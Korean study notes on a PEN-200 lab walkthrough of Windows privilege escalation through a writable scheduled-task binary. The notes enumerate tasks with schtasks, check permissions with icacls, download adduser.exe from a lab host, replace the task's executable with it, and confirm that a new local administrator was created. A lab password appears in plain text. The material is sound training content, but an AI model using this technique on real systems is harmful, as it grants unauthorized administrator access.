# 17.3.1 예약 작업

> **Scheduled Tasks** · PEN-200 §17.3.1

Windows 는 정리·업데이트 같은 자동 작업을 Task Scheduler 로 돌림. 작업 하나는 **트리거(trigger)** 와 **동작(action)** 의 짝임 — 트리거는 조건(특정 시각, 부팅 시, 로그온 시, 특정 이벤트 발생 시), 동작은 그때 실행할 프로그램·스크립트임.

권한 상승 관점에서 확인할 것은 셋뿐이고, 셋 다 답이 나와야 벡터가 성립함 —

- **어느 계정(principal) 권한으로 도는가** — 지금 사용자 권한으로 돌면 악용해도 얻을 것이 없음. `NT AUTHORITY\SYSTEM` 이나 관리자 계정이어야 상승이 됨
- **트리거가 무엇인가** — 조건이 이미 과거에 충족돼 다시는 안 도는 작업이면 표적이 못 됨. 일주일짜리 테스트인데 다음 실행이 그 뒤라면 다른 벡터를 찾되, **보고서에는 발견 사항으로 적음**
- **동작이 무엇인가** — 앞 둘이 「가능한가」를 답한다면 이것이 「어떻게 할 것인가」를 정함. 서비스에서 쓴 수법(바이너리 교체·누락 DLL 배치)이 그대로 통하고, 다만 서비스 바이너리 대신 **동작에 지정된 프로그램·스크립트**가 표적임

예제 대상은 RDP 로 접속한 CLIENTWK220 의 `steve`(비밀번호 `securityIsNotAnOption++++++`). 열거는 `Get-ScheduledTask` 또는 `schtasks /query` 로 함. 후자에 `/fo LIST` 로 목록 형식을, `/v` 로 전체 속성을 지정함. 출력이 방대하므로 **`Author` · `TaskName` · `Task To Run` · `Run As User` · `Next Run Time` 다섯 필드**를 먼저 훑음 — 위 세 질문에 부분적으로든 전부든 답을 주는 필드들임.

```
PS C:\Users\steve> schtasks /query /fo LIST /v
...
Folder: \Microsoft
HostName:                             CLIENTWK220
TaskName:                             \Microsoft\CacheCleanup
Next Run Time:                        7/11/2022 2:47:21 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/11/2022 2:46:22 AM
Last Result:                          0
Author:                               CLIENTWK220\daveadmin
Task To Run:                          C:\Users\steve\Pictures\BackendCacheCleanup.exe
Start In:                             C:\Users\steve\Pictures
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode
Run As User:                          daveadmin
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Minute
Start Time:                           7:37:21 AM
Start Date:                           7/4/2022
...
```

`\Microsoft\CacheCleanup` 이 세 조건을 전부 만족함 — `Run As User` 가 **`daveadmin`**(우리보다 높음), `Last Run Time` 과 `Next Run Time` 의 차가 1분이라 **매분 재실행**되고, 실행 대상이 하필 **`steve` 의 홈 디렉터리 안**인 `Pictures\BackendCacheCleanup.exe` 임.

홈 디렉터리이므로 권한은 있을 것이나 **확인 없이 넘어가지 말 것**.

```
PS C:\Users\steve> icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
C:\Users\steve\Pictures\BackendCacheCleanup.exe NT AUTHORITY\SYSTEM:(I)(F)
                                                BUILTIN\Administrators:(I)(F)
                                                CLIENTWK220\steve:(I)(F)
                                                CLIENTWK220\offsec:(I)(F)
```

`steve` 에 `F`(Full Access) 가 있으므로 교체가 됨. 앞 절의 `adduser.exe` 를 받아 이름을 바꿔 덮되, **원본을 `.bak` 으로 옮겨 보관**한 뒤 넣음 — 상승 성공 후 되돌리기 위함임.

```
PS C:\Users\steve> iwr -Uri http://192.168.48.3/adduser.exe -Outfile
BackendCacheCleanup.exe
PS C:\Users\steve> move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
PS C:\Users\steve> move .\BackendCacheCleanup.exe .\Pictures\
```

⚠️ 첫 명령이 교재 PDF 자체의 조판으로 두 줄로 접힘. 그대로 복사해 쓰면 실패함 — 한 줄로 이어 칠 것.

이후는 **기다리는 것뿐임** — 트리거가 매분이므로 1분 뒤 `net user` 와 `net localgroup administrators` 로 `dave2` 가 로컬 Administrators 에 들어갔는지 확인함.

```
PS C:\Users\steve> net user
User accounts for \\CLIENTWK220
-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave
dave2                    daveadmin                DefaultAccount
Guest                    offsec                   steve
WDAGUtilityAccount
The command completed successfully.
PS C:\Users\steve> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the
computer/domain
Members
-------------------------------------------------------------------------------
Administrator
BackupAdmin
dave2
daveadmin
offsec
The command completed successfully.
```
*예약 작업이 `daveadmin` 권한으로 돌아 `dave2` 를 만들고 Administrators 에 넣음*
